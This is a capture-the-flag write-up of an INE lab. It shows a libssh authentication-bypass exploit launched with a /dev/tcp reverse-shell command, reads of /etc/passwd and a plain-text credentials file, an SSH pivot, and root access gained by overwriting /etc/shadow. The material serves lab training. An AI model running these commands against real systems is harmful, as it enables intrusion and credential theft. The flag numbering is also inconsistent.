# Host & Network Penetration Testing: Post-Exploitation CTF 1

**Completed:** November 7th, 2025  
**Platform:** INE

---

## ðŸŽ¯ Target: target1.ine.local

### ðŸ” Nmap Scan

```bash
nmap -sS -sV -sC -T4 target1.ine.local
```

Found:
```
22/tcp open  ssh  libssh 0.8.3
```

---

### ðŸ”Ž Exploit Discovery

```bash
searchsploit libssh
```

Found:
- **LibSSH 0.7.6 / 0.8.4 - Unauthorized Access**  
  Path: `linux/remote/46307.py`

Downloaded the exploit:

```bash
searchsploit -m 46307.py
```

---

### ðŸ“– Why the Exploit Worked

Vulnerable versions of **libssh (0.7.6 to 0.8.4)** allow attackers to **bypass authentication** by sending a crafted `SSH2_MSG_USERAUTH_SUCCESS` message before actual login.  
This tricks the server into thinking the client is already authenticated, granting shell access without credentials.

---

### ðŸš Reverse Shell Setup

Exploit format required:
```python
(hostname, port, command)
```

Set up a listener:
```bash
nc -lvnp 4444
```

Executed the exploit:
```bash
python3 46307.py target1.ine.local 22 "bash -i >& /dev/tcp/192.95.14.2/4444 0>&1"
```

âœ… Got reverse shell access.

Retrieved the first flag:
```bash
cat /etc/passwd
```

---

## ðŸ–¥ï¸ Post-Exploitation Enumeration on target1.ine.local

Checked system info:
```bash
uname -a
```

Checked group memberships:
```bash
cat /etc/group
```

- Helped identify privileges  
- Found **second flag**

Checked cron jobs:
```bash
ls -la /etc/cron*
```

- No exploitable jobs  
- Discovered **third flag**

Checked hosts file:
```bash
cat /etc/hosts
```

- Revealed **fourth flag**

Found credentials file:
```bash
cat /home/user/credentials.txt
```

Found:
```
john:Pass@john123
```

---

## ðŸŒ Pivot to target2.ine.local

Attempted SSH using discovered credentials:

```bash
ssh john@target2.ine.local
```

âœ… Login successful with `john:Pass@john123`

---

### ðŸ”“ Privilege Escalation on target2

Checked cron jobs:
```bash
ls -la /etc/cron*
```

No viable jobs.

Searched for SUID binaries:
```bash
find / -perm -4000 2>/dev/null
```

â†’ Nothing useful.

---

### ðŸš¨ Misconfiguration Found

Had **read and write access** to `/etc/shadow`.

Generated a new root password hash:
```bash
openssl passwd -6 password
```

Replaced root's hash in `/etc/shadow`.

Then logged in as root:
```bash
ssh root@target2.ine.local
```

âœ… Gained root access  
ðŸ“¥ Retrieved fourth flag from root's account.
